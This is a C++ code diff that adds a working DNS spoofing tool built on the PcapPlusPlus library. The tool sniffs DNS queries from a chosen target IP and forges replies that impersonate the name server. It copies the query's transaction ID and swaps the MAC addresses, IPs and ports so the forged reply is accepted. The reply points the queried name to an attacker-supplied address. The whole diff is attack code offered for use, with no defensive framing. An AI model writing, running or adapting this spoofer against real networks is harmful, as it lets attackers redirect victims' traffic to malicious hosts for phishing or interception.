@@ -1,5 +1,15 @@
 #include "Program.h"
 
+#include <EthLayer.h>
+#include <IPv4Layer.h>
+#include <UdpLayer.h>
+#include <DnsLayer.h>
+
+#include <chrono>
+#include <thread>
+
+Arguments Program::args {};
+
 Program::Program(const std::string& name, int argc, char* argv[])
     : 
     name(name),
@@ -7,6 +17,71 @@ Program::Program(const std::string& name, int argc, char* argv[])
 {
     ParseArguments(argc, argv);
     InitCaptureInterface();
+}
+
+void Program::Run()
+{
+    dev->startCaptureBlockingMode(Program::OnPacketCapture, nullptr, 60);
+}
+
+bool Program::OnPacketCapture(pcpp::RawPacket* packet, pcpp::PcapLiveDevice* dev, void* cookie)
+{
+    pcpp::Packet parsedPacket(packet);
+
+    pcpp::EthLayer* ethLayer = parsedPacket.getLayerOfType<pcpp::EthLayer>();
+    pcpp::UdpLayer* udpLayer = parsedPacket.getLayerOfType<pcpp::UdpLayer>(); 
+    pcpp::IPv4Layer* ipLayer = parsedPacket.getLayerOfType<pcpp::IPv4Layer>();
+    pcpp::DnsLayer* dnsLayer = parsedPacket.getLayerOfType<pcpp::DnsLayer>();
+    
+    if(ipLayer->getSrcIPv4Address() != args.targetIP)
+        return false; // keep capturing
+
+    // Constructing the poisoned response
+    uint16_t originalID = dnsLayer->getDnsHeader()->transactionID;
+
+    pcpp::MacAddress sourceMac = ethLayer->getDestMac(); // They are switched because we are impersonating the name server
+    pcpp::MacAddress destMac = ethLayer->getSourceMac();
+
+    pcpp::IPv4Address sourceIP = ipLayer->getDstIPv4Address(); // They are switched because we are impersonating the name server
+    pcpp::IPv4Address destIP = ipLayer->getSrcIPv4Address();
+
+    uint16_t sourcePort = udpLayer->getDstPort(); // They are switched because we are impersonating the name server
+    uint16_t destPort = udpLayer->getSrcPort();
+
+    pcpp::DnsQuery* originalQuery = dnsLayer->getFirstQuery();
+    std::string dnsQueryName = originalQuery->getName();
+    pcpp::DnsClass dnsClass = originalQuery->getDnsClass();
+    pcpp::DnsType dnsType = originalQuery->getDnsType();
+
+    pcpp::EthLayer poisonedEthLayer(sourceMac, destMac);
+    pcpp::IPv4Layer poisonedIPLayer(sourceIP, destIP);
+    pcpp::UdpLayer poisonedUdpLayer(sourcePort, destPort);
+    pcpp::DnsLayer poisonedDnsLayer;
+    poisonedDnsLayer.getDnsHeader()->transactionID = originalID;
+
+
+    pcpp::IPv4DnsResourceData poisonedData(args.hostAddress);
+    poisonedDnsLayer.addQuery(originalQuery);
+    poisonedDnsLayer.addAnswer(dnsQueryName, dnsType, dnsClass, 300, &poisonedData)->setData(&poisonedData);
+
+    pcpp::Packet poisonedPacket(100);
+
+    poisonedPacket.addLayer(&poisonedEthLayer);
+    poisonedPacket.addLayer(&poisonedIPLayer);
+    poisonedPacket.addLayer(&poisonedUdpLayer);
+    poisonedPacket.addLayer(&poisonedDnsLayer);
+
+    poisonedPacket.computeCalculateFields();
+
+    if (!dev->sendPacket(&poisonedPacket))
+    {
+        std::cerr << "Failed to send poisoned packet." << std::endl;
+        return false; // continue capture
+
+    }
+
+    std::cout << "Poisoning successful." << std::endl;
+    return true; // stop capture
 }
 
 void Program::ParseArguments(int argc, char* argv[])
@@ -82,5 +157,24 @@ void Program::InitCaptureInterface()
             std::cerr << "Invalid interface!" << std::endl;
             exit(0);
         }
+    }
+
+    if (!dev->open())
+    {
+        std::cerr << "Failed to open interface." << std::endl;
+        exit(0);
+    }
+
+    // Setup the filters
+    pcpp::IPFilter ipFilter(args.targetIP.toString(), pcpp::SRC);
+    pcpp::ProtoFilter dnsFilter(pcpp::DNS);
+    pcpp::AndFilter combinedFilter;
+
+    combinedFilter.addFilter(&ipFilter);
+
+    if(!dev->setFilter(combinedFilter))
+    {
+        std::cerr << "Failed to setup capture filters." << std::endl;
+        exit(0);
     }
 }
